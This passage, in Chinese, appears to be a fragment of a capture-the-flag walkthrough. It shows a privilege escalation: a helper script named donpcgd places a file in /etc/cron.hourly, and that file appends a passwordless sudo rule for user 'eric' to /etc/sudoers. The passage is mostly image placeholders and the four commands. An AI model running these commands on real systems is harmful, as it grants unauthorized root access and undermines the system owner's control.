![](../Images/31ed386c097d4b0029ee9aab86a24b5e.png)

我在/tmp创建了dayu文件，然后使用donpcgd脚本将该文件放在/etc/cron.hourly文件夹中...

![](../Images/92807384b763dc70286fce29f4b8cdeb.png)

命令：

*   
*   
*   
*   

```
 1. touch /tmp/dayu 2. /usr/local/share/sgml/donpcgd /tmp/dayu /etc/cron.hourly/dayu 3. echo -e '#!/bin/bash\n echo "eric ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /etc/cron.hourly/dayu 4. chmod +x /etc/cron.hourly/dayu
```
